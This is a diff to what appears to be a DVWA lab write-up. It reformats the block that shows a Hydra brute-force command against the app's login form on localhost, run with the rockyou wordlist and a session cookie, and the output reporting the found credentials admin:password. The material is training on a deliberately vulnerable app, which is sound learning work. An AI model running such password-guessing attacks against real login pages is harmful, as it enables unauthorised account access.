@@ -51,9 +51,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vul
 
 Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page
 
+```markdown
+
 <details><summary>Click to see output</summary>
 
-```shell
+`
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -66,9 +68,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 23:50:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:59
 
-```
+`
 
 </details>
+
+```
 
 Login credentials found by hydra:
 `admin:password`
